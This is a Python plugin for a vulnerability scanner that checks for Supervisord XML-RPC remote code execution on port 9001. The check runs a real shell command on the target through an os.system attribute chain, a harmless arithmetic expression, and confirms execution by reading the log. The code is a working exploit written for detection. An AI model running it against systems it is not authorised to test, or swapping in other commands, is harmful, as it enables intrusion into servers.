#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
import random
try:
    from aiohttp_xmlrpc.client import ServerProxy     # pyinstaller only, to be analysed
except Exception as e:
    pass


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if port != 9001:
        return

    try:
        target = '%s://%s:9001/RPC2' % (service, ip)
        proxy = ServerProxy(target)
        old = await getattr(proxy, 'supervisor.readLog')(0, 0)
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        command = 'expr ' + str(a) + ' + ' + str(b)
        logfile = await getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        await getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system'
                      )('{} | tee -a {}'.format(command, logfile))
        result = await getattr(proxy, 'supervisor.readLog')(0, 0)
        if result[len(old):].strip() == str(a+b):
            ret = {
                'alert_group': 'Supervisord Remote Code Execution',
                'affects': target,
                'details': 'Supervisord Remote Code Execution: %s://%s:9001' % (service, ip)
            }
            return ret
    except Exception as e:
        debug(e)
    finally:
        if 'proxy' in vars():
            await proxy.close()


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9001, 'http', True, task_msg={})
    run_plugin_test(scan)
